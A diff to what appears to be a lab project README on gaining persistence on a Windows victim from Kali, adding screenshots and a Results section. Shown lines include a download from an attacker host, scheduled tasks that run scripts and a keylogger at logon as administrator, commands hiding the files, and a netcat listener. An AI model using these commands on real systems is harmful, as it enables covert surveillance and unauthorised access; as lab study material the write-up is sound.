@@ -124,7 +124,7 @@ Invoke-WebRequest -Uri "http://10.0.2.15/Persistance.vbs" -OutFile "C:\Persistan
 
 - **Setting the Scripts to Run at Logon**: The seguent command is executed `schtasks /create /tn "Persistance" /tr "wscript.exe 'C:\Persistance.vbs'" /sc onlogon /ru "BUILTIN\Administrators" /rp ""` to set the scripts to run at every log on as administrator by creating a task named "Persistance". This ensures that the attacker retains access to the machine, even if it is rebooted.
 
-Below is shown the results of the previous operations, on the left there are the two downloaded files in the victim machine, on the right there are the operations computed through the powershell in Kali
+Below are shown the results of the previous operations, on the left there are the two downloaded files in the victim machine, on the right there are the operations computed through the powershell in Kali
 ![Persistance Win_Kali](images/Persistance.png)
 
 Here the code inside the file "Persistance.ps1"
@@ -177,9 +177,14 @@ schtasks /create /tn "Key_Logger" /tr "wscript.exe 'C:\Key_Logger_Dw.vbs'" /sc o
 attrib +h Key_Logger_Dw.ps1; attrib +h Key_Logger_Dw.vbs; attrib +h Key_Logger.exe; attrib +h Client_Key_Logger.exe
 ```
 
+Below are shown the results of the previous operations, on the left there are the downloaded files in the victim machine and the newly created file `log.txt`, on the right there are the operations computed through the powershell in Kali.
 
-(Note: Insert screenshot of the keylogger, client, and server programs here)
+![Keylogger Win_Kali](images/KeyLogger.png)
 
+Note that the command that marks the files as hidden is not executed in the screenshot to get a better representation of the results.
+
+## Results
+In this section the victim machine is restarted to see that the persistance was actually gained. In Kali are executed two terminal windows: one that runs netcat as in the firsts steps of this project `nc -lvp 4444 -n`; on the other runs the program `Server_Key_Logger` that waits for a tcp connection. Below are shown the results at the
 (Note: Insert code snippet of the keylogger, client, and server programs here)
 
 ## Conclusion
